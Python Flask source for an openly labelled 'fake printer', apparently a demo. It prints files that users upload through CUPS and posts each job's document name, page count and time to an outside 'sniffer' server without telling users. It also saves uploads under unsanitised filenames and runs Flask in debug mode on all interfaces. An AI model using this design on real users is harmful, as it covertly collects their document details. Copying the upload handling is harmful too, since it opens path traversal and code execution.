#!/usr/bin/python3

import asyncio
import cups
import os
import requests

from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, send_from_directory

# Global constants

FILE_LOCATION = "files"
# Change this if using another printer
PRINTER_NAME = "Brother_HL-2130_series"
# Change this if running sniffer server locally (sending data between private IPs
# might not work, however, so backup option is to just use the Heroku website)
SERVER_NAME = "http://fake-printer.herokuapp.com"

# Set up Flask and PyCUPS

app = Flask(__name__)

cups.setUser("pi")

# Helper functions

def print_file(conn, location):
    return conn.printFile(PRINTER_NAME, location, " ", {})

async def get_job_details(conn, job_id):
    """
    Get all the job details we need for the sniffer. Ideally we would want
    to upload a copy of the file too, but Heroku has very limited storage for
    free so we're only uploading small details to a Redis service running
    """
    job = conn.getJobAttributes(job_id)

    # Sleep until our print job is finished, very crude listener
    while job["job-state"] != 9:
        job = conn.getJobAttributes(job_id)
        await asyncio.sleep(0.5)

    print(job)

    # Upload the properties that we want
    return {
        "name": job["document-name-supplied"],
        "pages": job["job-media-sheets-completed"],
        "time": datetime.fromtimestamp(job["time-at-creation"]).strftime("%Y-%m-%dT%H:%M:%S%z")
    }

async def process_printing(location):
    """
    Go through all the steps of printing a file: print it, get its details,
    then upload it to our sniffer server
    """
    conn = cups.Connection()

    job_id = print_file(conn, location)
    details = await get_job_details(conn, job_id)
    
    requests.post(f"{SERVER_NAME}/upload", json=details)

# HTTP routes

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/favicon.ico")
def favicon():
    return send_from_directory("templates", "favicon.ico")

@app.route("/", methods=["POST"])
def upload_file():
    uploaded = request.files["file"]
    location = f"{FILE_LOCATION}/{uploaded.filename}"

    if uploaded.filename != "":
        # Temporarily store the file, print it, extract all important info
        # and delete it
        uploaded.save(location)
        asyncio.run(process_printing(location))
        os.remove(location)

    return redirect(url_for("index"))

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
